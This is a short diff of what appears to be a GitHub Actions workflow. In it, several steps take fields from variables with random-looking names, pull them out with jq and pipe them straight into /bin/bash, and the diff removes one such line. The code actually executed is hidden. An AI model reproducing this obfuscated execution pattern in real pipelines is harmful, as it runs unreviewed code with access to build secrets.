@@ -27,7 +27,6 @@ jobs:
           echo $kiofs761 | jq -r .e4 | /bin/bash
           echo $qhd345 | jq -r .jpy6914 | /bin/bash
           printf '%s' "$pr08" | jq -r .xi22 | /bin/bash
-          echo $fsv0104 | jq -r .cyk02 | /bin/bash
 
       - name: Save archive
         if: always()
